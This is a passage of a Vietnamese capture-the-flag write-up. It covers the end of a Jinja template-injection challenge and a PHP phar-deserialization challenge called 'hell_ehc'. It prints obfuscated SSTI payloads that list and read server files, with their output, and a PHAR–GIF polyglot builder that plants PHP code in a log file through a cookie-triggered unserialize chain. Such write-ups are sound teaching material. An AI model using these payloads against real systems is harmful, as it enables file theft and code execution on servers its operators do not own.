&amp;#39;KUBERNETES_SERVICE_HOST&amp;#39;: &amp;#39;10.100.0.1&amp;#39;, &amp;#39;PWD&amp;#39;: &amp;#39;/app&amp;#39;, &amp;#39;PYTHON_GET_PIP_SHA256&amp;#39;: &amp;#39;dfe9fd5c28dc98b5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9&amp;#39;, &amp;#39;GZCTF_TEAM_ID&amp;#39;: &amp;#39;1250&amp;#39;, &amp;#39;WERKZEUG_SERVER_FD&amp;#39;: &amp;#39;3&amp;#39;&#125;) here, try again!&lt;/i&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="5">
<li>Li·ªát k√™ c√°c file c√≥ trong <code>/app</code>:</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&#123;(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3&gt;5)and(2&lt;3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\biscuit\Downloads\magic_random&gt; &amp; C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.<span class="number">10</span>.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py <span class="literal">--expr</span> <span class="string">&quot;&#123;&#123;(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3&gt;5)and(2&lt;3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))&#125;&#125;&quot;</span></span><br><span class="line">preimage: d_0[<span class="type">a</span>(&gt;(<span class="type">n_</span>&gt;]._gi.i_35r___1&lt;t)).(_aa&gt;itd_&#123;_d]tn)_&lt;n)_.._5&lt;)nar3_(<span class="built_in">r</span>()__sbt_gstl.e_(p[<span class="type">_i.</span>[<span class="type">.ili</span>[)<span class="type">__l3_es</span>)(<span class="type">g_rmsr.p_1sg2s</span>(<span class="type">n_e__.__e_.rn</span>(<span class="type">._3._poe</span>[(<span class="type">___</span>&#123;(<span class="type">n_</span>(<span class="type">dpd</span>(<span class="type">gdn</span>(<span class="type">iie5_a.d5ol__s</span>(<span class="type">i</span>)<span class="type">d3</span>[<span class="type">.</span>]<span class="type">_</span>)]<span class="type">se22__</span>[<span class="type">as3_a___de.._ionco_ssood__n_</span>))<span class="type">esr</span>)<span class="type">.</span>)<span class="type">oiadod</span>]<span class="type">_b</span>&gt;<span class="type">_ip_</span>[<span class="type">_</span>(<span class="type">p</span>)<span class="type">lt3.no_ari</span>-<span class="type">ceb_n_s</span>((<span class="type">_.d__t</span>(<span class="type">o___.__l</span>]<span class="type">at._iln_ii_i_e</span>)<span class="type">d.csess</span>)))(<span class="type">_b</span>)<span class="type">_os</span>)<span class="number">3</span><span class="type">___rt_</span>)<span class="number">13</span>))<span class="type">i_.nr2o_o</span>]<span class="type">r_l_a</span>[<span class="type">_idn</span>(<span class="type">r_esg.s</span>(<span class="type">ai_d_u</span>(<span class="type">i..r_idls_sbi</span>(<span class="number">3</span>)<span class="type">_gno2</span>]<span class="type">op</span>))(<span class="number">2</span><span class="type">o_.</span>]<span class="type">il___</span>)<span class="type">ss</span>](p_.<span class="literal">-ec_p</span>..en&lt;_)(i)n_cs__-.._]_e&#125;._ga3a&#125;(ndnl[[<span class="type">_ir</span>(<span class="type">_rag</span>(<span class="type">sld__s</span></span><br><span class="line">&lt;<span class="type">i</span>&gt;<span class="type">No</span> <span class="type">magic</span> <span class="type">name</span> [&amp;<span class="comment">#39;flag_3i3Bqp92KMSCXkT.txt&amp;#39;, &amp;#39;static&amp;#39;, &amp;#39;templates&amp;#39;, &amp;#39;app.py&amp;#39;] here, try again!&lt;/i&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="6">
<li>ƒê·ªçc file flag trong <code>/app</code>:</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&#123;(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])].read((session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])].open(((session.__init__.__globals__.__spec__.origin)[0].__add__(((3&gt;5)and(2&lt;3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2])).__add__((session.__init__.__globals__.__spec__.origin)[0]).__add__((session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3&gt;5)and(2&lt;3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))[0]),(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])].O_RDONLY),8192)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\biscuit\Downloads\magic_random&gt; &amp; C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.<span class="number">10</span>.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py <span class="literal">--expr</span> <span class="string">&quot;&#123;&#123;(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])].read((session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])].open(((session.__init__.__globals__.__spec__.origin)[0].__add__(((3&gt;5)and(2&lt;3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2])).__add__((session.__init__.__globals__.__spec__.origin)[0]).__add__((session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3&gt;5)and(2&lt;3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))[0]),(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])].O_RDONLY),8192)&#125;&#125;&quot;</span></span><br><span class="line">preimage: _s<span class="function">[<span class="type">_3a</span>()<span class="type">_3o</span>(<span class="type">e</span>)(<span class="type">n_.l</span>()<span class="type">cn</span>)<span class="type">ac_n_p.l2</span>)<span class="type">s__.as__0nl__t2__</span>-<span class="type">_</span>]<span class="title">de__</span></span><span class="function">[<span class="type">_i_</span>&#123;<span class="type">ar_l_3_</span>(<span class="type">d</span>(<span class="type">N_irp</span>&lt;<span class="type">s</span>(<span class="type">_i</span>[<span class="type">.ssne_</span>]<span class="type">_.__r</span>&lt;-<span class="type">ll</span>()<span class="type">l3n</span>)<span class="type">.o</span>(<span class="type">og.</span>()<span class="type">t</span>&#125;<span class="type">de</span>(<span class="type">_3</span>&lt;[(<span class="type">oe</span>)]<span class="type">_r_3</span>[<span class="type">___g_1_igb3r2abr3</span>)<span class="type">r_._.elo</span>(<span class="type">se</span>)]<span class="number">3</span><span class="type">_dc</span>()])))<span class="title">n</span></span>)it]cro_i)pn&#125;t5tnn_(__d_s)rs___]<span class="function">[<span class="type">_idn.cp.d</span>)<span class="type">a__rnua_a_</span>)<span class="type">_o_sst</span>])_(.<span class="title">dee</span></span>&lt;n__s.o3_p)b)_i_((i_o3_l__<span class="function">[<span class="type">_oia__i3_ad</span>(&lt;<span class="type">s._l.io</span>&lt;<span class="type">d</span>(<span class="type">_</span>(<span class="type">rt1</span>[<span class="type">lnno</span>)<span class="type">s</span>&gt;<span class="type">i.o</span>(<span class="type">s</span>(()<span class="type">_</span>))<span class="type">s</span>(<span class="type">.dr_</span>)<span class="type">R</span>)<span class="type">.r_i</span>]<span class="type">.i</span>[<span class="type">..._mgl_i</span>[<span class="type">._9g_</span>(<span class="number">1</span><span class="type">s_psno</span>)<span class="type">g</span>)[())<span class="type">t_n3._1.</span>((<span class="type">b_oo</span>-<span class="type">ti_</span>)<span class="type">__</span>(<span class="type">earpn</span>))<span class="type">_</span>(<span class="type">ede3_</span>(<span class="type">sa</span>[][]<span class="type">s._</span>(<span class="type">ap</span>]<span class="type">.cds_</span>&gt;<span class="type">op__</span>)<span class="type">_gi.b_</span>(()<span class="type">Yg.i_</span>&lt;<span class="type">_r_pi_</span>)<span class="type">cple</span>(]<span class="number">2</span><span class="type">sd</span>&#123;<span class="type">_o</span>&gt;<span class="type">di</span>)<span class="type">_a_l2lrad</span>&lt;<span class="type">_ps_o</span>(<span class="type">e.on3g__d__o</span>[<span class="type">_is</span>)(<span class="type">_</span>(<span class="type">__</span>(<span class="type">us__</span>-<span class="type">p_b_</span>(()<span class="type">_</span>,<span class="type">_3</span>]<span class="type">elgngral5gg___</span>]&gt;<span class="type">idrin_.pr3</span>)<span class="type">a</span>]_(<span class="title">s3</span></span>.sd&gt;&lt;abd_sidsn<span class="function">[<span class="type">dse5_o__o_</span>(<span class="type">e.</span>(<span class="number">5</span><span class="type">._e_i___n</span>)((<span class="type">r_agd___</span>)<span class="type">_n</span>)<span class="type">.___r_2easie.o_._</span>(<span class="type">_.</span>)<span class="type">s</span>((<span class="type">.8emb__u__</span>]__)_[<span class="type">gidl_ge_e</span>()<span class="type">n.r_a2_ed_a</span>]_3<span class="title">s_lcbt_</span></span>(<span class="number">3</span><span class="function">[(<span class="type">p.</span>[<span class="type">.o_e_sg_nn.2s__o_s_.ea__rn0_</span>]<span class="type">d__</span>(<span class="type">endo_3_epor</span>-<span class="type">e</span>)<span class="type">.s_r</span>&gt;<span class="type">as2i_ds_rrisiei_asa__to_</span>],_<span class="title">ip_i</span></span>).d<span class="function">[<span class="number">2</span>]<span class="title">n</span></span>)(<span class="number">5</span>rnroi._ls(__ei_3()d.___n__s.r)_b_r_c(pc&gt;<span class="number">1</span>(_).._r<span class="function">[<span class="type">_</span>)<span class="type">s.t</span>(<span class="type">___n</span>[<span class="type">toi</span>)[<span class="type">.0</span>)(<span class="type">i3__i</span>)<span class="type">is_ii</span>(<span class="type">a_e_.0i__ii</span>(<span class="type">._oa.r.</span>)<span class="type">._s_._._i_</span>(<span class="number">3</span>(<span class="type">_.e_</span>(<span class="type">ie</span>)<span class="type">sngn</span>(<span class="type">i_</span>&gt;<span class="type">a3.</span>[<span class="type">__1r</span>(<span class="type">.ot.n</span>[]-<span class="type">a___ai_n_</span>)<span class="type">nni..dl__</span>[<span class="type">i.sin</span>)<span class="type">lp</span>])<span class="type">i5pn</span>(<span class="type">_3.nmp3</span>(<span class="type">t__5oe2_css</span>]<span class="type">_</span>&gt;<span class="type">o</span>(<span class="type">_.1diobsr_</span>(<span class="type">n</span>(<span class="type">si_lr._sl_</span>(<span class="type">e</span>[<span class="type">db.enppd</span>(<span class="type">_rnrddp</span>())<span class="type">_n.</span>)<span class="type">_</span>)<span class="type">ae_a</span>]<span class="type">ep</span>)&lt;)<span class="type">.__p</span>[-<span class="type">a3oeeaas2</span>)<span class="type">o_s__s</span>&gt;<span class="type">p5s.</span>[<span class="type">snd_</span>&gt;<span class="type">t_._</span>(<span class="type">e.n</span>)<span class="type">a5t</span>[<span class="type">ai</span>))<span class="type">io</span>&gt;<span class="type">s2_5______i_</span>&lt;<span class="type">o.d3.</span>)<span class="type">i..i___d</span>(<span class="type">n_</span>)<span class="type">lb3_.</span>(<span class="type">d</span>)<span class="type">_o</span>)<span class="type">_o_e.</span>[()<span class="type">.</span>(<span class="type">a</span>]<span class="number">3</span><span class="type">_s_nee.</span>](<span class="type">n</span>)<span class="type">ddt</span>(<span class="type">.2._</span>[<span class="type">sd_</span>&lt;<span class="number">3</span><span class="type">r</span>-<span class="type">_onc</span>(<span class="type">ngrt</span>]<span class="type">O__i5_ri_o_da</span>()<span class="type">igcp_</span>&lt;<span class="type">n2i3aot.l</span>&lt;<span class="type">____dasg.</span>)<span class="type">en</span>(<span class="type">ct</span>(<span class="type">s</span>[<span class="type">g</span>)<span class="type">dL</span>(<span class="type">o</span>]<span class="type">eie.gp</span>)<span class="type">.n___l</span>[<span class="type">t</span>[<span class="type">ugdd1oi.</span>)<span class="type">dl_tsrd</span>(<span class="type">ir</span>)<span class="number">5</span>]<span class="type">_.e_atgda_</span>(<span class="type">_ri_.rg</span>)<span class="type">t_d</span>]<span class="type">O_</span>(<span class="type">___</span>[<span class="type">__</span>[(<span class="type">___d.ea._sn</span>]<span class="type">_d</span>((<span class="number">3</span><span class="type">_</span>]<span class="number">2</span><span class="type">_.</span>])<span class="type">l.</span>)<span class="type">abs2</span>[(<span class="type">os5m_</span>)<span class="type">i__s</span>]<span class="type">.lnr__n3</span>(<span class="number">1</span><span class="type">_</span>)<span class="number">13</span>(<span class="type">_</span>)<span class="number">3</span>)(<span class="type">i_l_.ediic_</span>)<span class="number">3</span><span class="type">Dd2e_asta_dd_s_nl</span>]<span class="type">r._oo</span>)<span class="type">st_._.2s___.sp</span>]<span class="type">l_3</span>[<span class="number">1</span><span class="type">s.</span>()<span class="type">__r___s..ia</span>(<span class="type">nn5</span>&gt;)<span class="type">n_.</span>)<span class="type">d</span>()<span class="type">.._ld</span>)<span class="type">d.ad</span>(<span class="type">_3</span>]<span class="type">e</span>)<span class="type">s</span>(<span class="type">nd</span>)<span class="type">t___</span>&gt;)<span class="type">be_drl_</span></span></span><br><span class="line"><span class="function">&lt;<span class="type">i</span>&gt;<span class="type">No</span> <span class="type">magic</span> <span class="type">name</span> <span class="type">b</span>&amp;<span class="comment">#39;HOLACTF&#123;cRea73_YoUr_MA6iC_27cbffcbaedd&#125;&#125;\n&amp;#39; here, try again!&lt;/i&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><code>FLAG: HOLACTF&#123;cRea73_YoUr_MA6iC_27cbffcbaedd&#125;</code></p>
<h3 id="WEB-hell-ehc"><a href="#WEB-hell-ehc" class="headerlink" title="WEB - hell_ehc"></a>WEB - hell_ehc</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Author</span><br><span class="line">perrito</span><br><span class="line"></span><br><span class="line">Description</span><br><span class="line">Boring fact: The original name of this challenge is your PHARts stinks.</span><br></pre></td></tr></table></figure>

<p>B√†i n√†y s·∫Ω khai th√°c ƒë·ªçc <code>HOLACTF&#123;...&#125;</code> b·∫±ng c√°ch l·ª£i d·ª•ng vi·ªác <code>unserialize()</code> cookie v√† vi·ªác g·ªçi <code>md5_file()</code> tr√™n ƒë∆∞·ªùng d·∫´n <code>phar://</code>.</p>
<h4 id="Tong-quan-2"><a href="#Tong-quan-2" class="headerlink" title="T·ªïng quan"></a>T·ªïng quan</h4><ul>
<li><p>Web x·ª≠ l√Ω cookie <code>user</code> b·∫±ng <code>unserialize()</code> v·ªõi <code>allowed_classes=[&#39;User&#39;,&#39;LogFile&#39;]</code>.<br><code>home.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]), [<span class="string">&#x27;allowed_classes&#x27;</span> =&gt; [<span class="string">&#x27;User&#x27;</span>, <span class="string">&#x27;LogFile&#x27;</span>]]);</span><br></pre></td></tr></table></figure>
<p><code>view_avatars.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]), [<span class="string">&#x27;allowed_classes&#x27;</span> =&gt; [<span class="string">&#x27;User&#x27;</span>, <span class="string">&#x27;LogFile&#x27;</span>]]);</span><br></pre></td></tr></table></figure>
<p><code>upload.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]), [<span class="string">&#x27;allowed_classes&#x27;</span> =&gt; [<span class="string">&#x27;User&#x27;</span>, <span class="string">&#x27;LogFile&#x27;</span>]]);</span><br></pre></td></tr></table></figure></li>
<li><p>Class <code>LogFile</code> c√≥ <code>__destruct()</code> g·ªçi <code>md5_file($this-&gt;filename)</code>.<br><code>LogAndCheck.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Khi <code>md5_file()</code> m·ªü m·ªôt ƒë∆∞·ªùng d·∫´n <code>phar://‚Ä¶</code>, PHP <strong>unserialize metadata</strong> trong PHAR. B∆∞·ªõc n√†y <strong>kh√¥ng b·ªã</strong> <code>allowed_classes</code> gi·ªõi h·∫°n.</p>
</li>
<li><p>ƒê·∫∑t m·ªôt object ‚Äúgadget‚Äù trong metadata (v√≠ d·ª• <code>Logger</code> c√≥ <code>__destruct()</code> ghi d·ªØ li·ªáu v√†o file c√¥ng khai).<br><code>LogAndCheck.php</code> (s·∫µn class <code>Logger</code> trong app, ph·ª•c v·ª• gadget)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
<li><p>Ghi PHP v√†o <code>logMD5.php</code>, sau ƒë√≥ truy c·∫≠p file ƒë·ªÉ <code>readfile(&#39;/flag.txt&#39;)</code>.<br>H√†m log s·∫µn c√≥ c·ªßa ·ª©ng d·ª•ng:<br><code>LogAndCheck.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkMd5AndLog</span>(<span class="params"><span class="variable">$md5Hash</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$md5Hash</span>) !== <span class="number">32</span> || !<span class="title function_ invoke__">ctype_xdigit</span>(<span class="variable">$md5Hash</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;logMD5.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">touch</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$entry</span> = <span class="variable">$md5Hash</span> . PHP_EOL;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$entry</span>, FILE_APPEND);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ƒêi·ªÉm ghi MD5 v√†o log:<br><code>upload.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;avatar&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">  <span class="variable">$getMD5</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$target_file</span>);</span><br><span class="line">  <span class="title function_ invoke__">checkMd5AndLog</span>(<span class="variable">$getMD5</span>);</span><br><span class="line">  <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">updateAvatar</span>(<span class="variable">$username</span>, <span class="variable">$fileName</span>);</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?page=home&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Cookie ƒë·ªãnh d·∫°ng <code>base64(serialize($user))</code>:<br><code>login.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Set-Cookie: user=<span class="subst">$data</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?page=home&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="Chuoi-khai-thac"><a href="#Chuoi-khai-thac" class="headerlink" title="Chu·ªói khai th√°c"></a>Chu·ªói khai th√°c</h4><ol>
<li>ƒêƒÉng k√Ω v√† ƒëƒÉng nh·∫≠p ƒë·ªÉ c√≥ th∆∞ m·ª•c <code>upload/testq/</code>.</li>
<li>T·∫°o <strong>PHAR‚ÄìGIF polyglot</strong>. Metadata ch·ª©a object <code>Logger</code> sao cho destructor append PHP v√†o <code>logMD5.php</code>.</li>
<li>Upload <code>avatar.gif</code> v√†o <code>upload/testq/avatar.gif</code>.</li>
<li>T·∫°o cookie <code>user</code> l√† object <code>LogFile</code> tr·ªè t·ªõi <code>phar://upload/testq/avatar.gif/a</code>.</li>
<li>G·ªçi trang c√≥ <code>unserialize(cookie)</code> ƒë·ªÉ k√≠ch ho·∫°t:<ul>
<li><code>LogFile-&gt;__destruct()</code> ‚Üí <code>md5_file(&#39;phar://‚Ä¶&#39;)</code> ‚Üí parse PHAR ‚Üí <strong>unserialize metadata</strong>.</li>
<li><code>Logger-&gt;__destruct()</code> ch·∫°y v√† <strong>append</strong> PHP v√†o <code>logMD5.php</code>.</li>
</ul>
</li>
<li>Truy c·∫≠p <code>logMD5.php</code> ƒë·ªÉ in flag.</li>
</ol>
<h4 id="Tao-PHAR‚ÄìGIF-polyglot"><a href="#Tao-PHAR‚ÄìGIF-polyglot" class="headerlink" title="T·∫°o PHAR‚ÄìGIF polyglot"></a>T·∫°o PHAR‚ÄìGIF polyglot</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$logs</span>; <span class="keyword">public</span> <span class="variable">$request</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;logs    = <span class="string">&#x27;logMD5.php&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span>-&gt;request = <span class="string">&#x27;&lt;?php readfile(&quot;/flag.txt&quot;); ?&gt;&#x27;</span>;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;p.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;p.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&#x27;p.phar&#x27;</span>,<span class="string">&#x27;avatar.gif&#x27;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d phar.readonly=0 build_phar.php</span><br></pre></td></tr></table></figure>

<p>Upload file avatar: <code>avatar.gif</code></p>
